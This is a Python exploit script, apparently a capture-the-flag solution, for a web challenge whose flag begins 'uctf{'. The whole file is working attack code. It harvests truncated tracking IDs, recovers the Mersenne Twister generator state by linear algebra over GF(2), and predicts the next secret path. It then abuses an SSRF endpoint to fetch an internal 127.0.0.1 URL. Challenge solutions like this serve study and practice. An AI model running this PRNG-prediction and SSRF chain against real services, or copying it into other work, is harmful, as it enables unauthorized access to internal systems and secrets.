#!/usr/bin/env python3
import sys
import time
import requests

M = 624
N = 397
MATRIX_A = 0x9908B0DF
UPPER_MASK = 0x80000000
LOWER_MASK = 0x7FFFFFFF
MASK32 = 0xFFFFFFFF


def temper_int(y):
    y ^= y >> 11
    y ^= (y << 7) & 0x9D2C5680
    y ^= (y << 15) & 0xEFC60000
    y ^= y >> 18
    return y & MASK32


def initial_symbolic_words():
    words = []
    for i in range(M):
        words.append([1 << (i * 32 + b) for b in range(32)])
    return words


def mt_next_symbolic(words, i):
    xi = words[i]
    xip1 = words[i + 1]
    x397 = words[i + N]

    lowbit = xip1[0]
    out = [0] * 32

    for b in range(32):
        if b == 31:
            shifted = 0
        elif b == 30:
            shifted = xi[31]
        else:
            shifted = xip1[b + 1]

        out[b] = x397[b] ^ shifted

        if (MATRIX_A >> b) & 1:
            out[b] ^= lowbit

    return out


def temper_symbolic(x):
    y = x[:]

    y = [
        y[b] ^ (y[b + 11] if b + 11 < 32 else 0)
        for b in range(32)
    ]

    mask = 0x9D2C5680
    y = [
        y[b] ^ (y[b - 7] if b >= 7 and ((mask >> b) & 1) else 0)
        for b in range(32)
    ]

    mask = 0xEFC60000
    y = [
        y[b] ^ (y[b - 15] if b >= 15 and ((mask >> b) & 1) else 0)
        for b in range(32)
    ]

    y = [
        y[b] ^ (y[b + 18] if b + 18 < 32 else 0)
        for b in range(32)
    ]

    return y


def add_equation(row, rhs, pivots):
    while row:
        p = row.bit_length() - 1

        if p in pivots:
            prow, prhs = pivots[p]
            row ^= prow
            rhs ^= prhs
        else:
            pivots[p] = (row, rhs)
            return

    if rhs:
        raise RuntimeError("inconsistent equations")


def recover_state_from_top16(observations):
    words = initial_symbolic_words()
    pivots = {}

    for i, obs in enumerate(observations):
        if i >= len(words):
            words.append(mt_next_symbolic(words, i - M))

        tempered = temper_symbolic(words[i])

        for b in range(16, 32):
            rhs = (obs >> (b - 16)) & 1
            add_equation(tempered[b], rhs, pivots)

    solution = 0

    for p in sorted(pivots):
        row, rhs = pivots[p]
        val = rhs ^ ((row & ~(1 << p) & solution).bit_count() & 1)

        if val:
            solution |= 1 << p

    state = []
    for i in range(M):
        state.append((solution >> (i * 32)) & MASK32)

    return state


def mt_next_int(seq, i):
    y = (seq[i] & UPPER_MASK) | (seq[i + 1] & LOWER_MASK)
    return (seq[i + N] ^ (y >> 1) ^ (MATRIX_A if y & 1 else 0)) & MASK32


def predict_next_output(observations):
    state = recover_state_from_top16(observations)
    seq = state[:]

    while len(seq) <= len(observations):
        seq.append(mt_next_int(seq, len(seq) - M))

    next_untempered = seq[len(observations)]
    return temper_int(next_untempered)


def get_manifest_once(base):
    r = requests.get(
        base + "/api/manifest",
        timeout=30,
        headers={"Connection": "close"},
    )
    r.raise_for_status()
    return int(r.json()["tracking_id"], 16)


def collect_tracking_ids(base, count):
    obs = []
    failures = 0

    while len(obs) < count:
        try:
            val = get_manifest_once(base)
            obs.append(val)

            if len(obs) % 100 == 0:
                print(f"[*] collected {len(obs)}/{count}")

        except requests.RequestException as e:
            failures += 1
            print(f"[!] request failed/timeout: {e}")
            print("[!] sequence may be broken, restarting collection from zero...")
            obs = []
            time.sleep(2)

            if failures >= 10:
                raise RuntimeError("too many network failures, rerun with fresh instance")

    return obs


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <base-url>")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    sample_count = 1280

    print("[*] target:", base)
    print("[*] collecting truncated PRNG outputs...")
    obs = collect_tracking_ids(base, sample_count)

    print("[*] recovering MT19937 state...")
    predicted = predict_next_output(obs)
    secret_path = f"{predicted:08x}"

    print("[+] predicted next secret path:", secret_path)

    internal = f"http://127.0.0.1:8081/{secret_path}"

    print("[*] fetching internal manifest via SSRF...")
    r = requests.get(
        base + "/api/fetch",
        params={"url": internal},
        timeout=10,
    )

    print("[*] status:", r.status_code)
    print(r.text)

    if "uctf{" in r.text:
        print("[+] solved")
    else:
        print("[-] failed. Rerun the script, and do not hit the site manually while it runs.")


if __name__ == "__main__":
    main()
